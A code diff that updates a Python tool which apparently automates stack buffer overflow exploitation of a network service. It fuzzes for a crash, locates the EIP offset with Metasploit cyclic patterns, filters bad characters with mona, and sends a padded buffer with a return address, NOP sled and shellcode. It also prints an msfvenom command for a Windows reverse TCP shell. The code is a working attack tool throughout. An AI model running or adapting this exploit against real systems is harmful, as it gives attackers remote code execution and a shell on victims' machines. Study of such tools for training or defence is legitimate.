@@ -19,11 +19,15 @@ def send_data(data: Union[bytes, str], timeout: int = 5) -> None:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
     s.connect((ip, port))
-    print("[+] Received: ", s.recv(1024).decode())
+
+    if not noreceive:
+        print("[+] Received: ", s.recv(1024).decode())
 
     if type(data) == str:
         data = data.encode()
+
     s.send(data)
+    print("[+] Sent: {}".format(data))
 
     print("[+] Received: ", s.recv(1024).decode())
     s.close()
@@ -42,26 +46,30 @@ def fuzz(start: int = 100, end: int = 10000) -> int:
         print("[-] Connection refused")
     except socket.timeout:
         offset = start
-        print(f"[!] crashed at: {offset}")
+        print(f"[!] Crashed at: {offset}")
         return offset
 
 
 def send_cyclic(offset: int) -> int:
     """Cyclic pattern to send to the app, and check for the exact pattern"""
     print("\n[+] Creating cyclic pattern with offset")
-    command = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {offset} > pattern.buf"
+    command = f"{msf}/tools/exploit/pattern_create.rb -l {offset} > pattern.buf"
     execute(command)
     buffer = open("pattern.buf", "r").read()
-    input("[~] Press enter to send cyclic pattern (restart the app)")
+    print("[!] Restart the app")
+    input("[~] Press enter to send cyclic pattern")
 
     try:
-        send_data(prefix + buffer.encode() + suffix)
+        if suffix != b"\n":
+            send_data(prefix + buffer.encode() + suffix)
+        else:
+            send_data(prefix + buffer.encode())
     except socket.timeout:
         print("[~] Crashed the app, check the EIP")
 
     eip = input("[?] Enter EIP value: ")
 
-    command = f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {eip.strip()}" + " | awk '{print $6}' > /tmp/offset"
+    command = f"{msf}/tools/exploit/pattern_offset.rb -q {eip.strip()}" + " | awk '{print $6}' > /tmp/offset"
     execute(command)
 
     with open("/tmp/offset", "r") as fp:
@@ -93,8 +101,9 @@ def generate_chars(badchars: [str]) -> bytes:
 
 
 def badchars_esp(offset: int) -> str:
-    input("\n[+] Press enter to send bad chars (restart the app)")
-    print("[!] pro tip: !mona bytearray -f \"\\x00\"")
+    print("\n[!] Restart the app")
+    input("[+] Press enter to send bad chars")
+    print("[!] Pro tip: !mona bytearray -f \"\\x00\"")
 
     # default badchar as \x00
     current_badchars = ["\\x00"]
@@ -115,8 +124,9 @@ def badchars_esp(offset: int) -> str:
         except socket.timeout:
             print("\n[+] allchars sent")
 
-        print("[+] current_badchars: ", current_badchars)
-        print("[!] pro tip: !mona compare -f c:\\path\\bytearray.bin -a esp")
+        print("[+] Current_badchars: ", current_badchars)
+        print("[!] Pro tip: !mona compare -f c:\\path\\bytearray.bin -a esp")
+        print("[!] Restart the app")
         command = input("[+] Enter badchar (\\x00 \\x01 ..) to filter out (type 'exit' to skip): ").strip()
         if command == "exit":
             break
@@ -158,9 +168,9 @@ def badchars_not_esp(offset: int) -> str:
         try:
             send_data(prefix + buffer + suffix)
         except socket.timeout:
-            print("\n[+] allchars sent")
+            print("\n[+] Allchars sent")
 
-        print("[+] current_badchars: ", current_badchars)
+        print("[+] Current_badchars: ", current_badchars)
         command = input("[+] Enter badchar to filter out (enter to skip): ").strip()
         if command == "exit":
             break
@@ -184,8 +194,11 @@ def shell_gen(badchars: str):
     print("[+] Generated shellcode at /tmp/shellcode")
 
 
-def exploit(offset: int):
+def exploit(offset: int, badchars: str):
     global eip_str
+
+    print(f"[!] Pro tip: !mona jmp -r esp -cpb \"{badchars}\"")
+    print("[!] Restart the app")
     eip_str = input("[+] Enter EIP address to overwrite (without 0x): ").strip()
 
     padding = "A" * offset
@@ -205,7 +218,7 @@ def exploit(offset: int):
     try:
         buffer = padding.encode() + eip + nops + shellcode
         print("[=] Buffer to be sent: ", buffer)
-        print("[+] exploiting.. ")
+        print("[+] Exploiting.. ")
         send_data(prefix + buffer + suffix)
     except socket.timeout:
         print("[+] Payload sent but timed out")
@@ -214,19 +227,20 @@ def exploit(offset: int):
 
 
 def check_esp(offset: int) -> None:
-    """function check if esp has large enough room for shelllcode"""
+    """function check if esp has enough room for shelllcode"""
     padding = "A" * offset
     eip = "B" * 4
     esp = "C" * 500
 
-    input("[=] Enter to send huge buffer (500 bytes of C) to check for space on ESP")
+    print("[!] Restart the app")
+    input("[=] Press enter to send huge buffer (500 bytes of C) to check for space on ESP")
     buffer = padding.encode() + eip.encode() + esp.encode()
 
     try:
         print("[?] Sending buffer")
         send_data(prefix + buffer + suffix)
     except socket.timeout:
-        print("[+] buffer sent, check for the ESP register content")
+        print("[+] Buffer sent, check for the ESP register content")
 
 
 def main() -> None:
@@ -236,7 +250,7 @@ def main() -> None:
     offset = send_cyclic(offset)
     check_esp(offset)
 
-    question = input("[?] Is the payload enough to be sent in ESP (y/n): ").strip()
+    question = input("[?] Is the payload small enough to be sent in ESP (y/n): ").strip()
     payload_in_esp = question.lower() == "y"
 
     if payload_in_esp:
@@ -245,13 +259,13 @@ def main() -> None:
         badchars = badchars_not_esp(offset)
 
     shell_gen(badchars)
-    exploit(offset)
-    
+    exploit(offset,badchars)
+
     print("\n[+] Exploit Info")
     print(f"[+] Address: {ip}:{port}")
     print(f"[+] EIP offset: {offset} bytes")
     print(f"[+] EIP value: 0x{eip_str}")
-    print(f"[+] bad chars: {badchars}")
+    print(f"[+] Bad chars: {badchars}")
     print(f"[+] Shell code: msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f python -v shellcode")
 
 
@@ -265,10 +279,13 @@ if __name__ == "__main__":
     parser.add_argument("--port", help = "target port to exploit", required = True)
     parser.add_argument("--rport", help = "reverse shell port", default = 443)
     parser.add_argument("--interface", help = "the interface to use", default = "tun0")
+    parser.add_argument("--msf", help = "metasploit framework directory to use", default = "/usr/share/metasploit-framework")
+    parser.add_argument("--noreceive", help = "use if the program doesn't send an initial response on connect", default = False, action="store_true")
+    parser.add_argument("--newline", help = "add newline character to the end of the sent data", default = False, action ="store_true")
 
     args = parser.parse_args()
 
-    global ip, port, timeout, prefix, suffix, rport, interface
+    global ip, port, timeout, prefix, suffix, rport, interface, msf, noreceive, newline
     ip: str = args.ip
     port: int = int(args.port)
     rport: int = int(args.rport)
@@ -276,5 +293,11 @@ if __name__ == "__main__":
     prefix: bytes = args.prefix.encode()
     suffix: bytes = args.suffix.encode()
     interface: str = args.interface
+    msf: str = args.msf
+    noreceive: bool = args.noreceive
+    newline: bool = args.newline
+
+    if newline:
+        suffix += b"\n"
 
     main()
